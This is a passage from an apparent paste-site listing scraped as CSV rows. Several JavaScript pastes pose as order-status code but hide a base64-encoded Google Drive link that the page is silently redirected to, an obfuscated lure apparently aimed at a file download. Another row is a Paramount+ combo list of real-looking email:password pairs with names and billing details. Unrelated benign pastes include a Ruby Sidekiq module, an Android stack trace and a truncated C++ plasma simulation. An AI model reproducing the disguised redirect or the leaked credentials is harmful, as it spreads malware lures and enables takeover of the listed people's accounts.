  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xAQuHmzn,Order.js,hubertzoo90,JavaScript,Sunday 20th of April 2025 05:45:55 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91938/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
yLJg95GP,Market.js,hubertzoo90,JavaScript,Sunday 20th of April 2025 05:30:20 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/88130/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4FUimjDq,Untitled,hubertzoo90,JavaScript,Sunday 20th of April 2025 05:14:59 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/28467/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
uzuqWpym,Paramout,Gekoos018,HTML,Sunday 20th of April 2025 05:12:43 PM CDT,"onzalyto2000@gmail.comigonzalo11 T USER = gonzalo | STATUS = ACTIVE I PLAN TYPE = standard Country = Chile :| PLAN BASE = CBS_ALL_ACCESS_AD_FREE_PACKAGE |ROLE = Paramount+ Global Monthly Standard | HAS SKY = NO X | CYCLE = pplus_inti_monthly | NextBillingDate = 2025-01-19 | PAYMENT METHOD = googleplay. I CONFIG By = @G suzan.gunceler@gmail.com:boncuk123 | USER = Bob | STATUS = ACTIVE | PLAN TYPE = standard | Country = Australia | PLAN BASE =CBS_ALL_ACCESS_AD_FREE_PACKAGE I ROLE = Partner Subscription Standard Product | HAS SKY = NOXX I CYCLE = paramountplus | NextBillingDate = 2025-02-12 | PAYMENT METHOD = partnersubscription. I CONFIG By = @G cesar9332vidal@gmail.com: Jazmin890414@ I USER = Adolfo Vidal I STATUS = ACTIVE | PLAN TYPE = standard | Country = Mexico | PLAN BASE = CBS_ALL_ACCESS_AD_FREE_PACKAGE | ROLE = Partner Subscription Standard Product |HAS SKY = NOX | CYCLE = paramountplus | NextBillingDate = 2025-02-04 | PAYMENT METHOD = partnersubscription. | CONFIG By @G Johnsleightse@amallcom.sorayan200 | USER = Adru | STATUS = ACTIVE | PLAN TYPE = standard | Country United Kingdom | PLAN BASE = CBS_ALL_ACCESS_AD_FREE_PACKAGE | ROLE = Partner Subscription Standard Product | HAS SKY = YESV I CYCLE = paramountplus | NextBillingDate = 2025-02-04 | PAYMENT METHOD = partnersubscriotion. I CONFIG Bv = @G
wellosandru@gmail.com:shomo099 USER "" Ellas |STATUS ACTIVE | PLAN TYPE = standard | Country = Paraguay """" 1 PLAN BASE PPLUS_INTL_MVPD_PACKAGE I ROLE MVPD Standard Product HAS SKY = NOX| CYCLE mvpd_product| NextBillingDate = 2025-01-19 PAYMENT METHOD = MVPD.| CONFiG By = @G edvaldo.alves@firetech-ba.com.br; Fire7300@ I USER = Edvaldo | STATUS = ACTIVE | PLAN TYPE = premium I Country= Brazil | PLAN BASE = PPLUS_INT premium monthly I HAS SKY =L_PREMIUM_PACKAGE I ROLE = Paramount+ NOX I CYCLE pplus_intl_premium_monthly I NextBillingDate = 2025-02-11 | PAYMENT METHOD = appleitunes. | CONFIG By = @G noracaraoz@hotmail.com:Millie15| USER = Nora | STATUS = ACTIVE| PLAN TYPE = standard | Country = Argentina | PLAN BASE = PPLUS_INTL _MVPD_PACKAGE I ROLE = MVPD Standard Product I HAS O SKY =NO X I CYCLE = mvpd_product I NextBillingDate = 2025-01-19 | PAYMENT METHOD = MVPD.| CONFIG By = @G actualpc2@gmail.com:dI230401 | USER = Marcelo | STATUS = ACTIVE | PLAN TYPE = standard | Country = Argentina I PLAN BASE = PPLUS_INTL_MVPD_PACKAGE |ROLE = MVPD Standard Product | HAS SKY = NOX I CYCLE = mvpd_product I NextBillingDate = 2025-01-19 | PAYMENT METHOD = MVPD. | CONFIG By = @G lauraalegre22@gmalil.com:Nach0326 | USER = laura | STATUS = ACTIVE | PLAN TYPE = standard I Country = Argentina PLAN BASE =PPLUS_INTL_MVPD_PACKAGEIROLE = MVPD Standard Product | HAS SKY = NO X | CYCLE = mvpd_product | NextBillingDate = 2025-01-19 | PAYMENT METHOD = MVPD. | CONFIG By = @G rafaelmontelpare@gmail.com: Valcheta1974 | USER = Rafael I STATUS | PLAN TYPE = standard I Country = Argentina | PLAN BASE =PPLUS_INTL_MVPD_PACKAGEIROLE = MVPD Standard Product | HAS SKY = NO X CYCLE mvpd_product JE NextBillingDate = 2025-01-19 | PAYMENT METHOD = MVPD. | CONFIG By = @G verocabus34@gmail.com:losnaranjos307 | USER = Veronica | STATUS = ACTIVE | PLAN TYPE= standard | Country = Argentina | PLAN BASE =PPLUS_INTL_MVPD_PACKAGE I ROLE = MVPD Standard Product | HAS SKY = NO X CYCLE =mvpd_product | NextBillingDate = 2025-01-19 | PAYMENT METHOD = MVPD. I CONFIG By = @G dlhcomp@outlook.com:R1963#404123 IUSER = Raúl | STATUS = ACTIVE | PLAN TYPE= standard | Country = Argentina | PLAN BASE= PPLUS_INTL _MVPD_PACKAGEI ROLE = MVPD Standard Product | HAS SKY = NOX CYCLE= mvpd_product | NextBllingDate = 2025-01-19 | PAYMENT METHOD = MVPD. I CONFIG By= @Miyi_prs
 O 1K 4:32 PM
0
Cnigma premíum canal facundo_norillo@hotmail.com.ar: Facu2019 | USER = Facundo | STATUS = ACTIVE | PLAN TYPE= standard I Country = Argentina | PLAN BASE = PPLUS_INTL MVPD_PACKAGE| ROLE = MVPD Standard Product | HAS SKY = NOX | CYCLE = mvpd_product | NextBillingDate = 2025-01-19 | PAYMENT METHOD = MVPD. | CONFIG By = @Miyi_prs guilhermefpa@icloud.com:Sandro1 | USER = Sandro | STATUS = ACTIVE | PLAN TYPE = standard I Country = Brazil | PLAN BASE = CBS_ALL_ACCESS_AD FREE PACKAGE I ROLE= Paramount+ Global Monthly Standard | HAS SKY = NO X | CYCLE = pplus_intl_monthly | NextBillingDate = 2025-02-18 | PAYMENT METHOD = googleplay. I CONFIG By = @Miyi_prs douglas.sts@outlook.com.br
31yadirF@2012 | USER = Douglas I STATUS = ACTIVE PLAN TYPE = standard I Country = Brazil 1 PLAN BASE = PPLUS_INTL_MVPD_PACKAGE I ROLE = MVPD Standard Product | HAS SKY = NOXX I CYCLE = mvpd_product | NextBillingDate = 2025-01-19 | PAYMENT METHOD = MVPD. | CONFIG By = "
i4njZj5w,trackable module for sidekiq status,4tolexx,Ruby,Sunday 20th of April 2025 05:05:08 PM CDT,"module TrackableJob
  extend ActiveSupport::Concern

  def sidekiq_status
    # return unless worker_id.present?

    # status = Sidekiq::Status::get_all(worker_id)

    # add_details_to_status(status)

    Sidekiq::Status::get_all(worker_id)
  end

  def cancel_worker
    Sidekiq::Status.stop!(worker_id)
  end

  # private

  # def add_details_to_status(status)
  #   status['pct_complete'] ||= pct_complete(status)
  #   status
  # end

  # def pct_complete(status)
  #   return 100 if status['status'] == 'complete'
  #   Sidekiq::Status::pct_complete(status['jid'])
  # end
end
"
HiXEzsyB,Products.js,hubertzoo90,JavaScript,Sunday 20th of April 2025 04:59:37 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/00157/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0yWDgxAS,2025-04-20T16:59:07.871297,powerampache,PHP,Sunday 20th of April 2025 04:59:08 PM CDT,"1.01-79-play (79) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.NullSessionException: Session is NULL
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.authToken(BaseAmpacheRepository.kt:87)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$authToken$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:959)
	at android.os.Handler.dispatchMessage(Handler.java:100)
	at android.os.Looper.loopOnce(Looper.java:257)
	at android.os.Looper.loop(Looper.java:342)
	at android.app.ActivityThread.main(ActivityThread.java:9579)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:619)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:929)

scrobble() - generic exception {""detailMessage"":""Session is NULL"",""stackTrace"":[]}"
XUxHDxEX,Order.js,hubertzoo90,JavaScript,Sunday 20th of April 2025 04:43:53 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/60696/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tQJzxYeY,v3.0 - Hagelaar forms,phystota,C++,Sunday 20th of April 2025 04:38:05 PM CDT,"#include <iostream>
#include <random>
#include <fstream>
#include <assert.h>

#include <math.h>
#include <time.h>
#include <iomanip>  // For std::fixed and std::setprecision

#include <algorithm>  // For std::shuffle
#include <numeric>    // For std::iota

//physical constants

#define m_e 9.1093837E-31 // electron mass in kg
#define M_n 6.6464731E-27 // Helium atom mass
#define k_b 1.380649E-23 // Boltzmann constant
#define q 1.602176634E-19 // elementary charge    - eV -> J transfer param
#define Coulomb_log 15.87 // Coulomb logarithm
#define epsilon_0 8.854188E-12 // Vacuum permittivity
#define Coulomb_const pow(q,4)/(pow(4.0*M_PI*epsilon_0,2)) // e^4/(4*pi*eps0)^2
#define thresh0 0.0 //elastic threshold
#define thresh1 19.82 // threshold energy excitation tripet state
#define thresh2 20.61 // threshold energy excitation singlet state
#define tau_singlet 0.0195

// simulation parameters

#define n_e 100000
// #define N_He 1000000 // Helium neutrals number
#define T_n 2.0 // Helium neutral temperature in eV
#define T_e 10.0    // electron Maxwell initial distribution
#define Emin 0.0
#define Emax 3000.0
#define Volume 1.0E-12 // Volume to calculate netral density and collision frequency 
#define total_time 1.0E-2 // 500 microsec time to equalibrate the system
#define dopant 1.0E-5 // addition to avoid zero
#define E_reduced 1.0 // constant electrin field along z-axis

#define bin_width 0.05 // keep energy step ~ this to maintain cross-section clarity (Ramsauer minimum etc)
#define N ( (int)((Emax-Emin)/bin_width) + 1) // add 1 to include E_max if needed?

// handling final energy bin

#define bin_width_smooth 0.05 // energy bin for smooth final distribution
#define N_smooth ( (int)((Emax-Emin)/bin_width_smooth) )



double solve_A(double s) { // Netwon method solver

    if (s > 3) {
        return 3*exp(-s);
    }
    if (s < 0.01) {
        return 1.0/s;
    }
    
    double A0 = 0.01; // initial guess
    double A = A0;  //starting with initial guess
    double tol = 1.0E-7; // accuracy

             
    for (int i = 0; i < 1000; i++){

        double tanhA = tanh(A);
        // Avoid division by an extremely small tanh(A)
        if (fabs(tanhA) < 1e-12) {
            std::cerr << ""tanh(A) too small, returning fallback at iteration "" << i << ""\n"";
            return 1.0E-7;
        }        

        double f = 1.0 / tanhA - 1.0 / A - exp(-s);
        if (fabs(f) < tol)
            break;

        double sinhA = sinh(A);
        if (fabs(sinhA) < 1e-12) {
            std::cerr << ""sinh(A) too small, returning fallback at iteration "" << i << ""\n"";
            return 1.0E-5;
        }

        double dfdA = -1.0/(sinh(A)*sinh(A)) + 1.0/(A*A);

        // Check if derivative is too close to zero to avoid huge updates
        if (fabs(dfdA) < 1e-12) {
            std::cerr << ""dfdA is too small at iteration "" << i << "", returning fallback\n"";
            if (s < 0.01) {
//                std::cout << ""Small s! Huge A!"" << ""\n"";
                return 1.0/s;
            }
            if (s > 3) {
                return 3.0*exp(-s);
            }
        }        

        A -= f/dfdA;

        // Early check for numerical issues
        if (std::isnan(A) || std::isinf(A)) {
            std::cerr << ""Numerical error detected, invalid A at iteration "" << i << ""\n"";
            return (A > 0) ? 1.0E-5 : -1.0E-5;  // Fallback value based on sign
        }        


    }

    return A;
}

struct Electron {

    //velocity components
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;
    //energy in eV
    double energy = 0.0;
    //Collision flag
    bool collided_en = false;
    bool collided_ee = false;

    // initializing Maxwell-Boltzmann distribution with T_e
    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/m_e);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }


};

struct CrossSection {
    double energy;
    double sigma;
};

double interpolate (double energy, const std::vector<CrossSection>& CS) {


    if (energy < CS.front().energy) {
//        std::cout << "" required energy value lower than range of cross-section data at energy: "" << energy << ""\n"";
        return 0.0;
    }
    if (energy > CS.back().energy) {
//        std::cout << "" required energy value higher than range of cross-section data"" << ""\n"";
        return 0.0;        
    }

    int step = 0;   
        while (step < CS.size() && energy > CS[step].energy) {
            step++;
        }

    double k = (CS[step].sigma - CS[step-1].sigma)/(CS[step].energy - CS[step-1].energy);
    double m = CS[step].sigma - k*CS[step].energy;
    
    return k*energy + m; 
}


struct NeutralParticle {

    double energy = 0.0;
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;

    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/M_n);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }
    
};

struct Excited_neutral {

    double energy;
    double vx;
    double vy;
    double vz;
    
};



int main() {

    clock_t start = clock();

    int N_He = 100000000;

    std::vector<Electron> electrons(n_e); // better to use vector instead of simple array as it's dynamically allocated (beneficial for ionization)
//    std::vector<NeutralParticle> neutrals(N_He); // I don't need a vector of neutrals bcs it's like a backhround in MCC-simulation

    std::vector<int> histo_random(N, 0); // initialize N size zero-vector for random (initial) histogram
    std::vector<int> histo_maxwell(N, 0); // initialize N size zero-vector for maxwellian histogram
    std::vector<int> histo_neutral(N, 0); // initialize N size zero-vector for neutral distribution histogram
    std::vector<int> histo_excited(N, 0); // initialize N size zero-vector for excited He distribution histogram

    std::vector<double> elastic_vec(N, 0); // precompiled elastic cross-section-energy vector
    std::vector<double> inelastic1_vec(N, 0); // precompiled inelastic(triplet excitation) cross-section-energy vector
    std::vector<double> inelastic2_vec(N, 0); // precompiled inelastic(singlet excitation) cross-section-energy vector    
    std::vector<double> superelastic1_vec(N, 0); // precompiled superelastic(triplet de-excitation) cross-section-energy vector
    std::vector<double> superelastic2_vec(N, 0); // precompiled superelastic(triplet de-excitation) cross-section-energy vector

    std::random_device rd; 
    std::mt19937 gen(rd());
    std::uniform_real_distribution<double> dis(0.0, 1.0);
    std::gamma_distribution<double> maxwell_neutral(1.5, T_n);
    std::gamma_distribution<double> maxwell_electron(1.5, T_e);

    std::ifstream elastic_cs_dat(""cross_sections/elastic.dat"");
    if (!elastic_cs_dat.is_open()) {
        std::cerr << ""Error opening elastic cross-sections file!"" << std::endl;
        return 1;
    }    

    std::ifstream excitation1_cs_dat(""cross_sections/inelastic_triplet.dat"");
    if (!excitation1_cs_dat.is_open()) {
        std::cerr << ""Error opening inelastic triplet cross-sections file!"" << std::endl;
        return 1;
    }

    std::ifstream excitation2_cs_dat(""cross_sections/inelastic_singlet.dat"");
    if (!excitation2_cs_dat.is_open()) {
        std::cerr << ""Error opening inelastic singlet cross-sections file!"" << std::endl;
        return 1;
    }

    // --- starts reading cross section datafiles

//-----------------elastic---------------------------//
    std::vector<CrossSection> elastic_CS_temp;

    double energy, sigma;

    while (elastic_cs_dat >> energy >> sigma) {
        elastic_CS_temp.push_back({energy, sigma});
    }    
    elastic_cs_dat.close();

    energy = 0.0;
    sigma = 0.0;
//-----------------triplet excitation---------------------------//
    std::vector<CrossSection> inelastic1_CS_temp;

    while (excitation1_cs_dat >> energy >> sigma) {
        inelastic1_CS_temp.push_back({energy, sigma});
    }    
    excitation1_cs_dat.close();    
//-----------------singlet excitation---------------------------//
    energy = 0.0;
    sigma = 0.0;

    std::vector<CrossSection> inelastic2_CS_temp;

    while (excitation2_cs_dat >> energy >> sigma) {
        inelastic2_CS_temp.push_back({energy, sigma});
    }    
    excitation2_cs_dat.close();    

    // --- finish reading cross-section datafiles  

    std::ofstream file0(""output_files/velocities.dat"");    
    std::ofstream file1(""output_files/energies.dat"");        
    std::ofstream file2(""output_files/energies_final.dat"");    
    std::ofstream file3(""output_files/histo_random.dat"");    
    file3 << std::fixed << std::setprecision(10);
    
    std::ofstream file4(""output_files/histo_maxwell.dat"");
    file4 << std::fixed << std::setprecision(10);           
    
    std::ofstream file5(""output_files/neutral_distribution.dat"");    
    std::ofstream file6(""output_files/E*f(E).dat"");    
    std::ofstream file7(""output_files/nu_max.dat"");
    std::ofstream file8(""output_files/electron_mean_energy.dat"");
    std::ofstream file9(""output_files/nu_elastic_average_initial.dat"");
    std::ofstream file10(""output_files/nu_inelastic1_average_initial.dat"");
    std::ofstream file11(""output_files/nu_elastic_average_final.dat"");
    std::ofstream file12(""output_files/nu_inelastic1_average_final.dat""); 
    std::ofstream file13(""output_files/log_output.dat"");  
    std::ofstream file14(""output_files/excited_energies.dat"");       
    std::ofstream file15(""output_files/excited_histo.dat"");             
    std::ofstream file_temp(""output_files/collision_rates.dat"");
    std::ofstream file16(""output_files/energy_gain.dat"");  

    // Initialize all electrons
    for (auto& e : electrons) {
        e.initialize(gen, dis, maxwell_electron);
    }

    // precalculate cross-sections for each energy bin
    for (int i = 0; i < N; i++){
        elastic_vec[i] = interpolate(bin_width*(i+0.5), elastic_CS_temp); //elastiuc
        inelastic1_vec[i] = interpolate(bin_width*(i+0.5), inelastic1_CS_temp); //triplet excitation
        inelastic2_vec[i] = interpolate(bin_width*(i+0.5), inelastic2_CS_temp); //singlet excitation
    }

    // precalculate superelastic cross-section (triplet -> ground) for each energy bin
    // detailed balance gives: sigma_j_i(E) = (g_i/g_j)*((E+theshold)/E)*sigma_i_j(E+theshold)
    for (int i = 0; i < N; i++){
        double energy = Emin + (i + 0.5) * bin_width;
        int thresh_bin = (int)( (thresh1 - Emin)/bin_width ); // calculating bin for threshold energy
        superelastic1_vec[i] = (1.0/3.0)*((energy + thresh1)/energy)*interpolate(energy + thresh1, inelastic1_CS_temp); // using detailed balance, calculating backward deexcitation cross-section
        superelastic2_vec[i] = (1.0/1.0)*((energy + thresh2)/energy)*interpolate(energy + thresh2, inelastic2_CS_temp);
    }

    for (int i = 0; i < n_e; i++){
        file1 << i << "" "" << electrons.at(i).energy << ""\n"";
        file0 << i << "" "" << electrons[i].vx << "" "" << electrons[i].vy << "" "" << electrons[i].vz << ""\n""; 
    }

    // -----initial electrons energy distribution starts------------////
    for (int i = 0; i < n_e; i++){
        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_random.size())
            histo_random[bin]++;
    }

    for (int i = 0; i < histo_random.size(); i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file3 << bin_center << "" "" <<  static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n""; // this is electron normalized distribution function
    }



    //calculating excited specied population

    /*From Boltzman distribution y_k = g_k*exp(-E_k/kT)/norm, where g_k - stat weight of k-state, 
    E_k - threshold energy for k-state, norm is a total partition function or normaliztion factor     */

    double part_ground = 1.0*exp(-0.0/T_n); // partition function for ground state
    double part_triplet = 3.0*exp(-thresh1/T_n); // partition function for triplet excited state
    double part_singlet = 1.0*exp(-thresh2/T_n); // partition function for singlet excited state
    double part_func_total = part_ground + part_triplet + part_singlet; // total partition function
    double N_trpilet = (part_triplet/part_func_total)*N_He; // population of tripet state 
    double N_singlet = (part_singlet/part_func_total)*N_He; // population of singlet state

    std::vector<Excited_neutral> exc_1(static_cast<int>(N_trpilet));  // vector to track triplet excited atoms of Helium
    std::vector<Excited_neutral> exc_2(static_cast<int>(N_singlet));  // vector to track singlet excited atoms of Helium    

    // adjusting neutrals number:

    N_He -= (N_trpilet + N_singlet);

    std::cout << N_He << ""\n"";

    // initializing excited species with Maxwellian distribution

    for (auto& exc : exc_1) {
    NeutralParticle tmp_neutral;
    tmp_neutral.initialize(gen, dis, maxwell_neutral);
    exc.energy = tmp_neutral.energy;
    exc.vx = tmp_neutral.vx;
    exc.vy = tmp_neutral.vy;
    exc.vz = tmp_neutral.vz;
    }

    for (auto& exc : exc_2) {
    NeutralParticle tmp_neutral;
    tmp_neutral.initialize(gen, dis, maxwell_neutral);
    exc.energy = tmp_neutral.energy;
    exc.vx = tmp_neutral.vx;
    exc.vy = tmp_neutral.vy;
    exc.vz = tmp_neutral.vz;
    }

    std::cout << ""Triplet population initialized: "" << exc_1.size() << ""\n"";
    std::cout << ""Singlet population initialized: "" << exc_2.size() << ""\n"";    

    // calculating excited specied population finished //


    //----- calculating number to calculate nu-average (both elastic/inelastic )from our electron distribution starts---------///
    // --- calculating nu(E)*f(E) for later external integration, using initial f(E)
    for (int i = 0; i < N; i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file9 << bin_center << "" "" << (N_He/Volume)*elastic_vec[i] * sqrt(2.0*bin_center*q/m_e)*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n"";
        file10 << bin_center << "" "" << (N_He/Volume)*inelastic1_vec[i] * sqrt(2.0*bin_center*q/m_e)*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n"";
    }
    //----- calculating nu-average from our electron distribution ends ---------///    

    // double dt = 0.1/nu_max;   // minimum should be 0.1/nu_max to get acceptable numerical error range see Vahedi Surrendra 1995
    // double steps = static_cast<int>(time/dt);

    // std::cout << steps << ""\n"";
    // std::cout << dt << ""\n"";

    // //using  null-collision technique, getting the number of particles colliding each step: P_collision = 1 - exp(-nu_max*dt)
    // int Ne_collided = (1.0-exp(-1.0*dt*nu_max))*n_e;

    // std::cout << ""Ne_collided:"" << Ne_collided << ""\n"";

    int print_interval = 10;
    int el_coll_counter = 0; // track all elastic collisions
    int exc1_coll_counter = 0; // track all triplet excitation collisions
    int exc2_coll_counter = 0; // track all singlet excitation collisions
    int null_coll_counter = 0; // track null-collisions
    int ee_coll_counter = 0; //track e-e Coulomb collisions
    int super1_coll_counter = 0; // track superelastic triplet collisions
    int super2_coll_counter = 0; // track superelastic triplet collisions    


    double a_z = ((-1.0)*q * E_reduced) / m_e;
    double mass_ratio = 2.0*(m_e/M_n);
    double charge_mass_ratio = 0.5*m_e/q;
    double sqrt_charge_mass = sqrt(2*q/m_e);
    double C1 = -1.0*q*E_reduced;
    double C2 = 0.5*C1*C1/m_e;

    double t_elapsed = 0.0;

    std::cout << C1 << ""    "" << C2 << ""\n"";


    // -----calculating nu-max for null-collision method starts ------------////
    double nu_max = 0.0;
    double nu_max_temp = 0.0;
    double sigma_total = 0.0;
    
    for (int i = 0; i < N; i++){
        // Get initial densities
        double n_ground = N_He / Volume;
        double n_excited1 = exc_1.size() / Volume;
        double n_excited2 = exc_2.size() / Volume;
 
        double energy = Emin + (i + 0.5) * bin_width;
 
        // Total collision frequency for this energy bin
        double sigma_total = 
            elastic_vec[i] * n_ground +
            inelastic1_vec[i] * n_ground +
            inelastic2_vec[i] * n_ground +
            superelastic1_vec[i] * n_excited1 +
            superelastic2_vec[i] * n_excited2;
 
        double v = sqrt(2 * energy * q / m_e);
        double nu_temp = sigma_total * v;
        
        if (nu_temp > nu_max) nu_max = nu_temp;
    }
 
    std::cout << ""initial nu_max: "" <<nu_max << ""\n"";
    // -----calculating nu-max for null-collision method ends ------------////    

    double dt = 0.001/nu_max;   // minimum should be 0.1/nu_max to get acceptable numerical error range see Vahedi Surrendra 1995


    while (t_elapsed < total_time) {
        // Handle edge case for final step
        if (t_elapsed + dt > total_time) {
            dt = total_time - t_elapsed;
        }    
 
 
        //using  null-collision technique, getting the number of particles colliding each step: P_collision = 1 - exp(-nu_max*dt)
        int Ne_collided = (1.0-exp(-1.0*dt*nu_max))*n_e;   

        // Generate shuffled list of electron indices
        int reshuffle_interval = 1;
        std::vector<int> electron_indices(n_e);
        std::iota(electron_indices.begin(), electron_indices.end(), 0); // fill with index


        for (int i = 0; i < Ne_collided; ++i) {
